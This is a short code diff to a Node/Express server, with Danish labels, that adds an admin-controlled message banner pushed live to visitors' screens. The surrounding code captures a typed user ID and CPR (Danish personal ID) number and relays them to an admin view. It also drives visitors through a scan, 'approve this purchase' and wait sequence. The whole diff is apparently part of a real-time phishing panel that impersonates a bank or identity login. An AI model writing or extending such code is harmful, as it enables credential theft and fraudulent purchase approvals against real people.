@@ -30,6 +30,7 @@ function defaultState() {
     // flow-sekvensen: 'besked' -> 'scan' -> 'action' (egen tekst: godkend køb osv.) -> 'wait' -> 'approved'
     flow: 'brugerid',
     typed: { brugerId: '', cpr: '' },
+    beskedBanner: { visible: false, text: '' },
     action: { title: 'Godkend dette køb', amount: '', detail: '' },
     tekst: '',
     target: '',
@@ -628,6 +629,7 @@ function publicPayload() {
     action: { title: a.title || 'Godkend dette køb', amount: a.amount || '', detail: a.detail || '' },
     tekst: state.tekst || '',
     typed: state.typed || { brugerId: '', cpr: '' },
+    beskedBanner: state.beskedBanner || { visible: false, text: '' },
     annulerer: state.flow === 'annuller',
     offlineTitle: state.offlineTitle,
     offlineBody: state.offlineBody
@@ -742,6 +744,16 @@ app.post('/api/typed', (req, res) => {
     saveState(state);
     io.emit('admin-state-update', safeAdminState());
   }
+  res.json({ ok: true });
+});
+app.post('/api/besked-banner', requireAdmin, (req, res) => {
+  const { visible, text } = req.body;
+  state.beskedBanner = state.beskedBanner || { visible: false, text: '' };
+  if (visible !== undefined) state.beskedBanner.visible = !!visible;
+  if (text !== undefined) state.beskedBanner.text = String(text).slice(0, 200);
+  saveState(state);
+  io.emit('state-update', publicPayload());
+  io.emit('admin-state-update', safeAdminState());
   res.json({ ok: true });
 });
 // 404-handler + global express-fejl-handler — ALLERSIDST i filen,
